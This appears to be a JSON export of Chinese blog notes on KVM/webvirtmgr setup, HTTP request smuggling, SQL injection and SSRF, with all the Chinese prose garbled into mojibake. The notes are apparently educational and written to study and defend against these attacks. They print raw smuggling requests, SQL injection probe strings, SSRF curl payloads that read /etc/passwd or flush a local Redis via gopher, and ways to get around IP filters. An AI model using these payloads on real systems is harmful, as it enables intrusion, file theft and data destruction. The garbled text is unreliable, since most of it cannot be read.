ç‚¹å‡»ä¸Šæ–¹çš„IPåœ°å€ï¼Œä¸æ˜¯ç‚¹å‡»Hostï¼š192.168.157.99 3.3.2 kvmå­˜å‚¨ç®¡ç† &#x2F;&#x2F;åˆ›å»ºå­˜å‚¨ ç‚¹å‡»New Storage **** è¿›å…¥å­˜å‚¨ ç‚¹å‡»default æ± è·¯å¾„ &#x2F;var&#x2F;lib&#x2F;libvirt&#x2F;imagesï¼šç£ç›˜é•œåƒISOæ–‡ä»¶å­˜å‚¨çš„ä½ç½® &#x2F;&#x2F;é€šè¿‡è¿œç¨‹è¿æ¥è½¯ä»¶ä¸Šä¼ ISOé•œåƒæ–‡ä»¶è‡³å­˜å‚¨ç›®å½•&#x2F;var&#x2F;lib&#x2F;libvirt&#x2F;images&#x2F; 1234[root@mp ~]# cd /var/lib/libvirt/images/[root@mp images]# llæ€»ç”¨é‡ 3963904-rw-r--r-- 1 root root 4059037696 3æœˆ 15 03:50 rhel-server-7.4-x86_64-dvd.iso &#x2F;&#x2F;åœ¨webç•Œé¢æŸ¥çœ‹ISOé•œåƒæ–‡ä»¶æ˜¯å¦å­˜åœ¨ &#x2F;&#x2F;åˆ›å»ºç³»ç»Ÿå®‰è£…é•œåƒ &#x2F;&#x2F;æ·»åŠ æˆåŠŸå¦‚ä¸‹å›¾ 3.3.3 kvmç½‘ç»œç®¡ç† ç‚¹å‡»New Network 3.3.4 å®ä¾‹ç®¡ç† å®ä¾‹ï¼ˆè™šæ‹Ÿæœºçš„åˆ›å»ºï¼‰ &#x2F;&#x2F;è™šæ‹Ÿæœºæ’å…¥å…‰ç›˜ &#x2F;&#x2F;è®¾ç½®åœ¨webä¸Šè®¿é—®è™šæ‹Ÿæœºçš„å¯†ç  &#x2F;&#x2F;å¯åŠ¨è™šæ‹Ÿæœº &#x2F;&#x2F;è™šæ‹Ÿæœºå®‰è£… æ­¤æ­¥éª¤ä¸ºè™šæ‹Ÿæœºçš„å®‰è£…æ­¥éª¤ï¼Œä¸å†é˜è¿° *5*|*0**4. æ‰€é‡é—®é¢˜**5*|***1***4.1 æ•…éšœä¸€ ç¬¬ä¸€æ¬¡é€šè¿‡webè®¿é—®kvmæ—¶å¯èƒ½ä¼šä¸€ç›´è®¿é—®ä¸äº†ï¼Œä¸€ç›´è½¬åœˆï¼Œè€Œå‘½ä»¤è¡Œç•Œé¢ä¸€ç›´æŠ¥é”™(too many open files) 123456789æ°¸ä¹…ç”Ÿæ•ˆæ–¹æ³•ï¼š ä¿®æ”¹/etc/security/limits.confï¼Œåœ¨æ–‡ä»¶åº•éƒ¨æ·»åŠ ï¼š * soft nofile 655360 * hard nofile 655360 æ˜Ÿå·ä»£è¡¨å…¨å±€ï¼Œ softä¸ºè½¯ä»¶ï¼Œhardä¸ºç¡¬ä»¶ï¼Œnofileä¸ºè¿™é‡ŒæŒ‡å¯æ‰“å¼€æ–‡ä»¶æ•°ã€‚ å¦å¤–ï¼Œè¦ä½¿limits.confæ–‡ä»¶é…ç½®ç”Ÿæ•ˆï¼Œå¿…é¡»è¦ç¡®ä¿ pam_limits.so æ–‡ä»¶è¢«åŠ å…¥åˆ°å¯åŠ¨æ–‡ä»¶ä¸­ã€‚æŸ¥çœ‹ /etc/pam.d/login æ–‡ä»¶ä¸­æœ‰ï¼šsession required /lib/security/pam_limits.so *5*|***2***4.2 æ•…éšœäºŒ webç•Œé¢é…ç½®å®Œæˆåå¯èƒ½ä¼šå‡ºç°ä»¥ä¸‹é”™è¯¯ç•Œé¢ è§£å†³æ–¹æ³•æ˜¯å®‰è£…novncå¹¶é€šè¿‡novnc_serverå¯åŠ¨ä¸€ä¸ªvnc 12345678910111213141516[root@mp ~]# ll /etc/rc.locallrwxrwxrwx. 1 root root 13 Aug 6 2018 /etc/rc.local -&amp;gt; rc.d/rc.local[root@mp ~]# ll /etc/rc.d/rc.local-rw-r--r-- 1 root root 513 Mar 11 22:35 /etc/rc.d/rc.local[root@mp ~]# chmod +x /etc/rc.d/rc.local[root@mp ~]# ll /etc/rc.d/rc.local-rwxr-xr-x 1 root root 513 Mar 11 22:35 /etc/rc.d/rc.local[root@mp ~]# vim /etc/rc.d/rc.local......æ­¤å¤„çœç•¥Nè¡Œ# that this script will be executed during boot.touch /var/lock/subsys/localnohup novnc_server 172.16.12.128:5920 &amp;amp;[root@mp ~]# . /etc/rc.d/rc.local å®‰è£…yay auråŒ…ç®¡ç†å™¨1234git clone https://aur.archlinux.org/yay-bin.gitcd yay-binmakepkg -si é€šè¿‡aurå®‰è£…12yay -S webvirtmgr-gityaourt -S webvirtmgr-git å¦‚æœè¿æ¥å¤±è´¥1234å¯ä»¥ä½¿ç”¨wattlkä¹Ÿå°±æ˜¯steam++å‘½ä»¤å¦‚ä¸‹curl -sSL https://steampp.net/Install/Linux.sh | bashç„¶ååœ¨å°è¯• é‡‡ç”¨å‘½ä»¤è¡Œè‡ªå¸¦çš„ç®¡ç†è¿›è¡Œå®‰è£…è™šæ‹Ÿæœº1è¿™steam++é€Ÿåº¦ä¹Ÿä¸æ˜¯å¾ˆè¡Œ centos debian archlinuxç‰µæ‰¯é—®é¢˜ï¼š12å†…æ ¸åŠ è½½ç­‰ï¼Œæˆ‘ä¸æƒ³æŠ˜è…¾äº†ã€‚äºæ˜¯é€‰æ‹©æ›´æ¢ç¨³å®šçš„å‘è¡Œç‰ˆã€‚ç”¨archåšæœåŠ¡å™¨æ˜¯æˆ‘ä»Šå¹´åšè¿‡æœ€æ„šè ¢çš„äº‹æƒ…ä¹‹ä¸€äº†","categories":[],"tags":[]},{"title":"httpè¯·æ±‚èµ°ç§","slug":"httpè¯·æ±‚èµ°ç§","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:48:06.035Z","comments":true,"path":"2023/12/26/httpè¯·æ±‚èµ°ç§/","link":"","permalink":"http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/","excerpt":"","text":"HTTP è¯·æ±‚èµ°ç§ç®€ä»‹HTTPè¯·æ±‚èµ°ç§æ˜¯ä¸€ç§å¹²æ‰°ç½‘ç«™å¤„ç†HTTPè¯·æ±‚åºåˆ—æ–¹å¼çš„æŠ€æœ¯ï¼Œæœ€æ—©åœ¨ 2005 å¹´çš„ä¸€ç¯‡ æ–‡ç«  ä¸­è¢«æå‡ºã€‚ æˆå› è¯·æ±‚èµ°ç§å¤§å¤šå‘ç”Ÿäºå‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯ä¼ å…¥çš„æ•°æ®ç†è§£ä¸ä¸€è‡´çš„æƒ…å†µã€‚è¿™æ˜¯å› ä¸ºHTTPè§„èŒƒæä¾›äº†ä¸¤ç§ä¸åŒçš„æ–¹æ³•æ¥æŒ‡å®šè¯·æ±‚çš„ç»“æŸä½ç½®ï¼Œå³ Content-Length å’Œ Transfer-Encoding æ ‡å¤´ã€‚ åˆ†ç±» CLTEï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨ Content-Length å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨ Transfer-Encoding å¤´ TECLï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨ Transfer-Encoding æ ‡å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨ Content-Length æ ‡å¤´ã€‚ TETEï¼šå‰ç«¯å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒ Transfer-Encoding æ ‡å¤´ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä»¥æŸç§æ–¹å¼æ¥è¯±å¯¼å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†å®ƒã€‚ æ”»å‡»clä¸ä¸º0çš„GETè¯·æ±‚å½“å‰ç«¯æœåŠ¡å™¨å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¸å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œå®ƒä¼šç›´æ¥å¿½ç•¥æ‰GETè¯·æ±‚ä¸­çš„ Content-Length å¤´ï¼Œä¸è¿›è¡Œå¤„ç†ã€‚ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š 1234567GET / HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 44\\r\\nGET /secret HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n å‰ç«¯æœåŠ¡å™¨å¤„ç†äº† Content-Length ï¼Œè€Œåç«¯æœåŠ¡å™¨æ²¡æœ‰å¤„ç† Content-Length ï¼ŒåŸºäºpipelineæœºåˆ¶è®¤ä¸ºè¿™æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„è¯·æ±‚ï¼Œå°±é€ æˆäº†æ¼æ´çš„å‘ç”Ÿã€‚ CL-CLæ ¹æ®RFC 7230ï¼Œå½“æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ä¸­åŒ…å«ä¸¤ä¸ª Content-Length ï¼Œè€Œä¸”ä¸¤è€…çš„å€¼ä¸åŒæ—¶ï¼Œéœ€è¦è¿”å›400é”™è¯¯ï¼Œä½†æ˜¯æœ‰çš„æœåŠ¡å™¨å¹¶æ²¡æœ‰ä¸¥æ ¼å®ç°è¿™ä¸ªè§„èŒƒã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå½“å‰åç«¯å„å–ä¸åŒçš„ Content-Length å€¼æ—¶ï¼Œå°±ä¼šå‡ºç°æ¼æ´ã€‚ä¾‹å¦‚ï¼š 1234567POST / HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 8\\r\\nContent-Length: 7\\r\\n12345\\r\\na è¿™ä¸ªä¾‹å­ä¸­aå°±ä¼šè¢«å¸¦å…¥ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼Œå˜ä¸º aGET / HTTP/1.1\\r\\n ã€‚ CL-TECL-TEæŒ‡å‰ç«¯æœåŠ¡å™¨å¤„ç† Content-Length è¿™ä¸€è¯·æ±‚å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨éµå®ˆRFC2616çš„è§„å®šï¼Œå¿½ç•¥æ‰ Content-Length ï¼Œå¤„ç† Transfer-Encoding ã€‚ä¾‹å¦‚ï¼š 12345678910POST / HTTP/1.1\\r\\nHost: example.com\\r\\n...Connection: keep-alive\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\na è¿™ä¸ªä¾‹å­ä¸­aåŒæ ·ä¼šè¢«å¸¦å…¥ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼Œå˜ä¸º aGET / HTTP/1.1\\r\\n ã€‚ TE-CLTE-CLæŒ‡å‰ç«¯æœåŠ¡å™¨å¤„ç† Transfer-Encoding è¯·æ±‚å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨å¤„ç† Content-Length è¯·æ±‚å¤´ã€‚ä¾‹å¦‚ï¼š 1234567891011POST / HTTP/1.1\\r\\nHost: example.com\\r\\n...Content-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n12\\r\\naPOST / HTTP/1.1\\r\\n\\r\\n0\\r\\n\\r\\n TE-TETE-TEæŒ‡å‰åç«¯æœåŠ¡å™¨éƒ½å¤„ç† Transfer-Encoding è¯·æ±‚å¤´ï¼Œä½†æ˜¯åœ¨å®¹é”™æ€§ä¸Šè¡¨ç°ä¸åŒï¼Œä¾‹å¦‚æœ‰çš„æœåŠ¡å™¨å¯èƒ½ä¼šå¤„ç† Transfer-encoding ï¼Œæµ‹è¯•ä¾‹å¦‚ï¼š 123456789101112131415POST / HTTP/1.1\\r\\nHost: example.com\\r\\n...Content-length: 4\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-encoding: cow\\r\\n\\r\\n5c\\r\\naPOST / HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0\\r\\n\\r\\n é˜²å¾¡ ç¦ç”¨åç«¯è¿æ¥é‡ç”¨ ç¡®ä¿è¿æ¥ä¸­çš„æ‰€æœ‰æœåŠ¡å™¨å…·æœ‰ç›¸åŒçš„é…ç½® æ‹’ç»æœ‰äºŒä¹‰æ€§çš„è¯·æ±‚","categories":[],"tags":[]},{"title":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥è¯¦è§£ç¬”è®°","date":"2023-12-25T18:01:50.000Z","updated":"2024-01-21T16:43:48.402Z","comments":true,"path":"2023/12/26/sqlæ³¨å…¥è¯¦è§£ç¬”è®°/","link":"","permalink":"http://example.com/2023/12/26/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3%E7%AC%94%E8%AE%B0/","excerpt":"sqlæ³¨å…¥ [TOC]","text":"sqlæ³¨å…¥ [TOC] åˆ¤æ–­æ³¨å…¥ç‚¹1.å­—ç¬¦å‹12345id=1&#x27; and 1 = 1--+id=1&#x27; and 1 = 2--+å¦‚æœä¸æ­£å¸¸å›æ˜¾è¯´æ˜å­˜åœ¨è¯¥æ³¨å…¥ç‚¹ 2.æ•°å­—å‹12id=1 and 1 = 1--+id=1 and 1 = 2--+ åˆ¤æ–­å­—ç¬¦æ®µæ•°é‡123456789id=1&#x27; order by 3 --+id=1&#x27; order by 4 --+order by order by å­—æ®µå -- è¿™æ˜¯å¸¸è§„ç”¨æ³• order by int -- è¿™æ˜¯æ•°å­—æ›¿ä»£äº†å­—æ®µçš„ä½ç½®ã€‚æ‰€ä»¥å› æ­¤å¯ä»¥åˆ¤æ–­æœ‰å‡ ä¸ªå­—æ®µ ä¸æ­£å¸¸å›æ˜¾ã€‚è¯´æ˜è¯­å¥é”™è¯¯ã€‚è¯´æ˜ä¸å­˜åœ¨é‚£ä¹ˆå¤šçš„å­—æ®µæ•° sqlæ³¨é‡Šä»£ç 123456-- å•è¡Œæ³¨é‡Š --ä¸æ³¨é‡Šå†…å®¹å¿…é¡»ç”¨ç©ºæ ¼éš”å¼€æ‰æœ‰æ•ˆ--è¿™æ ·å°±ä¸è¡Œ--+æŸåŸå›  +æˆä¸ºç©ºæ ¼/* å¤šè¡Œæ³¨é‡Š*/ SQL UNION æ“ä½œç¬¦12345678-- ç”¨æ¥åˆå¹¶å¤šä¸ªselectæŸ¥è¯¢è¯­å¥çš„ç»“æœé›†/*UNION æ“ä½œç¬¦ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ª SELECT è¯­å¥çš„ç»“æœé›†ã€‚è¯·æ³¨æ„ï¼ŒUNION å†…éƒ¨çš„æ¯ä¸ª SELECT è¯­å¥å¿…é¡»æ‹¥æœ‰ç›¸åŒæ•°é‡çš„åˆ—ã€‚åˆ—ä¹Ÿå¿…é¡»æ‹¥æœ‰ç›¸ä¼¼çš„æ•°æ®ç±»å‹ã€‚åŒæ—¶ï¼Œæ¯ä¸ª SELECT è¯­å¥ä¸­çš„åˆ—çš„é¡ºåºå¿…é¡»ç›¸åŒã€‚*/SELECT column_name(s) FROM table1UNIONSELECT column_name(s) FROM table2; 1234567891011121314151617181920212223-- æ¼”ç¤ºmysql&gt; SELECT * FROM Websites;+----+--------------+---------------------------+-------+---------+| id | name | url | alexa | country |+----+--------------+---------------------------+-------+---------+| 1 | Google | https://www.google.cm/ | 1 | USA || 2 | æ·˜å® | https://www.taobao.com/ | 13 | CN || 3 | èœé¸Ÿæ•™ç¨‹ | http://www.runoob.com/ | 4689 | CN || 4 | å¾®åš | http://weibo.com/ | 20 | CN || 5 | Facebook | https://www.facebook.com/ | 3 | USA || 7 | stackoverflow | http://stackoverflow.com/ | 0 | IND |+----+---------------+---------------------------+-------+---------+mysql&gt; SELECT * FROM apps;+----+------------+-------------------------+---------+| id | app_name | url | country |+----+------------+-------------------------+---------+| 1 | QQ APP | http://im.qq.com/ | CN || 2 | å¾®åš APP | http://weibo.com/ | CN || 3 | æ·˜å® APP | https://www.taobao.com/ | CN |+----+------------+-------------------------+---------+3 rows in set (0.00 sec) sqlå‡½æ•°123456DATABASE æŸ¥çœ‹æ•°æ®åº“CURRENT_USER è¿”å›æœåŠ¡å™¨ç”¨æ¥éªŒè¯å½“å‰å®¢æˆ·ç«¯çš„ MySQL å¸æˆ·çš„ç”¨æˆ·åå’Œä¸»æœºåSESSION_USER è¿”å›å½“å‰ MySQL ç”¨æˆ·åå’Œä¸»æœºåSYSTEM_USER è¿”å›å½“å‰ MySQL ç”¨æˆ·åå’Œä¸»æœºåVERSION è¿”å› MySQL æ•°æ®åº“çš„å½“å‰ç‰ˆæœ¬USER è¿”å›å½“å‰ MySQL ç”¨æˆ·åå’Œä¸»æœºå","categories":[],"tags":[]},{"title":"ssrf","slug":"ssrf","date":"2023-12-25T18:01:50.000Z","updated":"2024-01-21T16:43:57.604Z","comments":true,"path":"2023/12/26/ssrf/","link":"","permalink":"http://example.com/2023/12/26/ssrf/","excerpt":"SSRF[TOC] ç®€ä»‹æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆServer Side Request Forgery, SSRFï¼‰æŒ‡çš„æ˜¯æ”»å‡»è€…åœ¨æœªèƒ½å–å¾—æœåŠ¡å™¨æ‰€æœ‰æƒé™æ—¶ï¼Œåˆ©ç”¨æœåŠ¡å™¨æ¼æ´ä»¥æœåŠ¡å™¨çš„èº«ä»½å‘é€ä¸€æ¡æ„é€ å¥½çš„è¯·æ±‚ç»™æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€‚SSRFæ”»å‡»é€šå¸¸é’ˆå¯¹å¤–éƒ¨ç½‘ç»œæ— æ³•ç›´æ¥è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚","text":"SSRF[TOC] ç®€ä»‹æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆServer Side Request Forgery, SSRFï¼‰æŒ‡çš„æ˜¯æ”»å‡»è€…åœ¨æœªèƒ½å–å¾—æœåŠ¡å™¨æ‰€æœ‰æƒé™æ—¶ï¼Œåˆ©ç”¨æœåŠ¡å™¨æ¼æ´ä»¥æœåŠ¡å™¨çš„èº«ä»½å‘é€ä¸€æ¡æ„é€ å¥½çš„è¯·æ±‚ç»™æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€‚SSRFæ”»å‡»é€šå¸¸é’ˆå¯¹å¤–éƒ¨ç½‘ç»œæ— æ³•ç›´æ¥è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ æ¼æ´å±å®³SSRFå¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œæ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ï¼Œæˆ–è€…åˆ©ç”¨Fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ã€‚ å†…ç½‘æœåŠ¡é˜²å¾¡ç›¸å¯¹å¤–ç½‘æœåŠ¡æ¥è¯´ä¸€èˆ¬ä¼šè¾ƒå¼±ï¼Œç”šè‡³éƒ¨åˆ†å†…ç½‘æœåŠ¡ä¸ºäº†è¿ç»´æ–¹ä¾¿å¹¶æ²¡æœ‰å¯¹å†…ç½‘çš„è®¿é—®è®¾ç½®æƒé™éªŒè¯ï¼Œæ‰€ä»¥å­˜åœ¨SSRFæ—¶ï¼Œé€šå¸¸ä¼šé€ æˆè¾ƒå¤§çš„å±å®³ã€‚ åˆ©ç”¨æ–¹å¼SSRFåˆ©ç”¨å­˜åœ¨å¤šç§å½¢å¼ä»¥åŠä¸åŒçš„åœºæ™¯ï¼Œé’ˆå¯¹ä¸åŒåœºæ™¯å¯ä»¥ä½¿ç”¨ä¸åŒçš„åˆ©ç”¨å’Œç»•è¿‡æ–¹å¼ã€‚ ä»¥curlä¸ºä¾‹, å¯ä»¥ä½¿ç”¨dictåè®®æ“ä½œRedisã€fileåè®®è¯»æ–‡ä»¶ã€gopheråè®®åå¼¹Shellç­‰åŠŸèƒ½ï¼Œå¸¸è§çš„Payloadå¦‚ä¸‹ï¼š 1234567curl -vvv &#x27;dict://127.0.0.1:6379/info&#x27;curl -vvv &#x27;file:///etc/passwd&#x27;# * æ³¨æ„: é“¾æ¥ä½¿ç”¨å•å¼•å·ï¼Œé¿å…$å˜é‡é—®é¢˜curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a% ç›¸å…³å±é™©å‡½æ•°SSRFæ¶‰åŠåˆ°çš„å±é™©å‡½æ•°ä¸»è¦æ˜¯ç½‘ç»œè®¿é—®ï¼Œæ”¯æŒä¼ªåè®®çš„ç½‘ç»œè¯»å–ã€‚ä»¥PHPä¸ºä¾‹ï¼Œæ¶‰åŠåˆ°çš„å‡½æ•°æœ‰ file_get_contents() &#x2F; fsockopen() &#x2F; curl_exec() ç­‰ã€‚ è¿‡æ»¤ç»•è¿‡æ›´æ”¹IPåœ°å€å†™æ³•ä¸€äº›å¼€å‘è€…ä¼šé€šè¿‡å¯¹ä¼ è¿‡æ¥çš„URLå‚æ•°è¿›è¡Œæ­£åˆ™åŒ¹é…çš„æ–¹å¼æ¥è¿‡æ»¤æ‰å†…ç½‘IPï¼Œå¦‚é‡‡ç”¨å¦‚ä¸‹æ­£åˆ™è¡¨è¾¾å¼ï¼š ^10(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d))&#123;3&#125;$ ^172\\.([1][6-9]|[2]\\d|3[01])(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d))&#123;2&#125;$ ^192\\.168(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d))&#123;2&#125;$ å¯¹äºè¿™ç§è¿‡æ»¤æˆ‘ä»¬é‡‡ç”¨æ”¹ç¼–IPçš„å†™æ³•çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œä¾‹å¦‚192.168.0.1è¿™ä¸ªIPåœ°å€å¯ä»¥è¢«æ”¹å†™æˆï¼š 8è¿›åˆ¶æ ¼å¼ï¼š0300.0250.0.1 16è¿›åˆ¶æ ¼å¼ï¼š0xC0.0xA8.0.1 10è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š3232235521 16è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š0xC0A80001 åˆå¹¶åä¸¤ä½ï¼š1.1.278 &#x2F; 1.1.755 åˆå¹¶åä¸‰ä½ï¼š1.278 &#x2F; 1.755 &#x2F; 3.14159267 å¦å¤–IPä¸­çš„æ¯ä¸€ä½ï¼Œå„ä¸ªè¿›åˆ¶å¯ä»¥æ··ç”¨ã€‚ è®¿é—®æ”¹å†™åçš„IPåœ°å€æ—¶ï¼ŒApacheä¼šæŠ¥400 Bad Requestï¼Œä½†Nginxã€MySQLç­‰å…¶ä»–æœåŠ¡ä»èƒ½æ­£å¸¸å·¥ä½œã€‚ å¦å¤–ï¼Œ0.0.0.0è¿™ä¸ªIPå¯ä»¥ç›´æ¥è®¿é—®åˆ°æœ¬åœ°ï¼Œä¹Ÿé€šå¸¸è¢«æ­£åˆ™è¿‡æ»¤é—æ¼ã€‚ ä½¿ç”¨è§£æåˆ°å†…ç½‘çš„åŸŸåå¦‚æœæœåŠ¡ç«¯æ²¡æœ‰å…ˆè§£æIPå†è¿‡æ»¤å†…ç½‘åœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨localhostç­‰è§£æåˆ°å†…ç½‘çš„åŸŸåã€‚ å¦å¤– xip.io æä¾›äº†ä¸€ä¸ªæ–¹ä¾¿çš„æœåŠ¡ï¼Œè¿™ä¸ªç½‘ç«™çš„å­åŸŸåä¼šè§£æåˆ°å¯¹åº”çš„IPï¼Œä¾‹å¦‚192.168.0.1.xip.ioï¼Œè§£æåˆ°192.168.0.1ã€‚ åˆ©ç”¨è§£æURLæ‰€å‡ºç°çš„é—®é¢˜åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåç«¯ç¨‹åºå¯èƒ½ä¼šå¯¹è®¿é—®çš„URLè¿›è¡Œè§£æï¼Œå¯¹è§£æå‡ºæ¥çš„hoståœ°å€è¿›è¡Œè¿‡æ»¤ã€‚è¿™æ—¶å€™å¯èƒ½ä¼šå‡ºç°å¯¹URLå‚æ•°è§£æä¸å½“ï¼Œå¯¼è‡´å¯ä»¥ç»•è¿‡è¿‡æ»¤ã€‚ æ¯”å¦‚ http://www.baidu.com@192.168.0.1/ å½“åç«¯ç¨‹åºé€šè¿‡ä¸æ­£ç¡®çš„æ­£åˆ™è¡¨è¾¾å¼ï¼ˆæ¯”å¦‚å°†httpä¹‹ååˆ°comä¸ºæ­¢çš„å­—ç¬¦å†…å®¹ï¼Œä¹Ÿå°±æ˜¯www.baidu.comï¼Œè®¤ä¸ºæ˜¯è®¿é—®è¯·æ±‚çš„hoståœ°å€æ—¶ï¼‰å¯¹ä¸Šè¿°URLçš„å†…å®¹è¿›è¡Œè§£æçš„æ—¶å€™ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šè®¤ä¸ºè®¿é—®URLçš„hostä¸ºwww.baidu.comï¼Œè€Œå®é™…ä¸Šè¿™ä¸ªURLæ‰€è¯·æ±‚çš„å†…å®¹éƒ½æ˜¯192.168.0.1ä¸Šçš„å†…å®¹ã€‚ åˆ©ç”¨è·³è½¬å¦‚æœåç«¯æœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°å‚æ•°åï¼Œæ­£ç¡®çš„è§£æäº†URLçš„hostï¼Œå¹¶ä¸”è¿›è¡Œäº†è¿‡æ»¤ï¼Œæˆ‘ä»¬è¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨è·³è½¬çš„æ–¹å¼æ¥è¿›è¡Œç»•è¿‡ã€‚ å¯ä»¥ä½¿ç”¨å¦‚ http://httpbin.org/redirect-to?url=http://192.168.0.1 ç­‰æœåŠ¡è·³è½¬ï¼Œä½†æ˜¯ç”±äºURLä¸­åŒ…å«äº†192.168.0.1è¿™ç§å†…ç½‘IPåœ°å€ï¼Œå¯èƒ½ä¼šè¢«æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤æ‰ï¼Œå¯ä»¥é€šè¿‡çŸ­åœ°å€çš„æ–¹å¼æ¥ç»•è¿‡ã€‚ å¸¸ç”¨çš„è·³è½¬æœ‰302è·³è½¬å’Œ307è·³è½¬ï¼ŒåŒºåˆ«åœ¨äº307è·³è½¬ä¼šè½¬å‘POSTè¯·æ±‚ä¸­çš„æ•°æ®ç­‰ï¼Œä½†æ˜¯302è·³è½¬ä¸ä¼šã€‚ . é€šè¿‡å„ç§éHTTPåè®®å¦‚æœæœåŠ¡å™¨ç«¯ç¨‹åºå¯¹è®¿é—®URLæ‰€é‡‡ç”¨çš„åè®®è¿›è¡ŒéªŒè¯çš„è¯ï¼Œå¯ä»¥é€šè¿‡éHTTPåè®®æ¥è¿›è¡Œåˆ©ç”¨ã€‚ æ¯”å¦‚é€šè¿‡gopherï¼Œå¯ä»¥åœ¨ä¸€ä¸ªurlå‚æ•°ä¸­æ„é€ POSTæˆ–è€…GETè¯·æ±‚ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»å†…ç½‘åº”ç”¨çš„ç›®çš„ã€‚ä¾‹å¦‚å¯ä»¥ä½¿ç”¨gopheråè®®å¯¹ä¸å†…ç½‘çš„RedisæœåŠ¡è¿›è¡Œæ”»å‡»ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„URLï¼š 1gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d% é™¤äº†gopheråè®®ï¼ŒFileåè®®ä¹Ÿæ˜¯SSRFä¸­å¸¸ç”¨çš„åè®®ï¼Œè¯¥åè®®ä¸»è¦ç”¨äºè®¿é—®æœ¬åœ°è®¡ç®—æœºä¸­çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç±»ä¼¼ file:///path/to/file è¿™ç§æ ¼å¼æ¥è®¿é—®è®¡ç®—æœºæœ¬åœ°æ–‡ä»¶ã€‚ä½¿ç”¨fileåè®®å¯ä»¥é¿å…æœåŠ¡ç«¯ç¨‹åºå¯¹äºæ‰€è®¿é—®çš„IPè¿›è¡Œçš„è¿‡æ»¤ã€‚ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ file:///d:/1.txt æ¥è®¿é—®Dç›˜ä¸­1.txtçš„å†…å®¹ã€‚ DNS Rebindingä¸€ä¸ªå¸¸ç”¨çš„é˜²æŠ¤æ€è·¯æ˜¯ï¼šå¯¹äºç”¨æˆ·è¯·æ±‚çš„URLå‚æ•°ï¼Œé¦–å…ˆæœåŠ¡å™¨ç«¯ä¼šå¯¹å…¶è¿›è¡ŒDNSè§£æï¼Œç„¶åå¯¹äºDNSæœåŠ¡å™¨è¿”å›çš„IPåœ°å€è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœåœ¨é»‘åå•ä¸­ï¼Œå°±ç¦æ­¢è¯¥æ¬¡è¯·æ±‚ã€‚ 